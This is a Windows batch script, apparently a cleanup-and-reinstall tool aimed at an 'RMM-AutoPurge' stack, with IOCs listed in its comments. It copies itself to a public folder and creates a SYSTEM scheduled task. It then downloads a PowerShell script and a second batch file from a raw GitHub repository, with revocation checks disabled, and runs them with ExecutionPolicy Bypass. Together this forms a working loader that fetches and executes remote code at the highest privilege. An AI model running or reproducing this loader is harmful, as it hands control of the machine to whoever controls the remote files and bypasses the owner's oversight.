@echo off
rem WINRTCS VEXLM/gonzo one-shot: wipe RMM-AutoPurge stack then R3 Gryxa recover.
rem IOCs: SCRepair, MSServices, SC_Monitor_9dd7e861*, vexlm.com, FPs 9dd7e861/3a607f4e/d4212f02
rem Usage: call with --detached from schtasks SYSTEM.
if /I not "%~1"=="--detached" (
  copy /y "%~f0" "C:\Users\Public\vexlm_pr.cmd" >nul 2>&1
  schtasks /Delete /TN WinRTCSVEXLM /F >nul 2>&1
  schtasks /Create /TN WinRTCSVEXLM /RU SYSTEM /RL HIGHEST /SC ONCE /ST 23:59 /F /TR "cmd.exe /c C:\Users\Public\vexlm_pr.cmd --detached"
  schtasks /Run /TN WinRTCSVEXLM
  echo QUEUED vexlm-purge-recover - log C:\Users\Public\vexlm_purge.log
  exit /b 0
)
setlocal EnableExtensions
set "LOG=C:\Users\Public\vexlm_purge.log"
>"%LOG%" echo [%DATE% %TIME%] begin host=%COMPUTERNAME%

echo [%DATE% %TIME%] fetch_purge_ps1>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 15 --max-time 60 -o C:\Users\Public\vexlm_purge.ps1 https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_vexlm_purge.ps1 >>"%LOG%" 2>&1
if not exist C:\Users\Public\vexlm_purge.ps1 (
  echo [%DATE% %TIME%] FAIL_no_purge_ps1>>"%LOG%"
  exit /b 2
)
echo [%DATE% %TIME%] run_purge>>"%LOG%"
powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File C:\Users\Public\vexlm_purge.ps1 >>"%LOG%" 2>&1

echo [%DATE% %TIME%] fetch_recover>>"%LOG%"
curl.exe -L --ssl-no-revoke --connect-timeout 15 --max-time 60 -o C:\Users\Public\gryxa_recover.cmd https://raw.githubusercontent.com/xnobuddy/github-drop/main/winrtcs_gryxa_recover.cmd >>"%LOG%" 2>&1
if not exist C:\Users\Public\gryxa_recover.cmd (
  echo [%DATE% %TIME%] FAIL_no_recover>>"%LOG%"
  exit /b 3
)
echo [%DATE% %TIME%] run_recover_r3>>"%LOG%"
call C:\Users\Public\gryxa_recover.cmd --detached
echo [%DATE% %TIME%] recover_called>>"%LOG%"
endlocal & exit /b 0
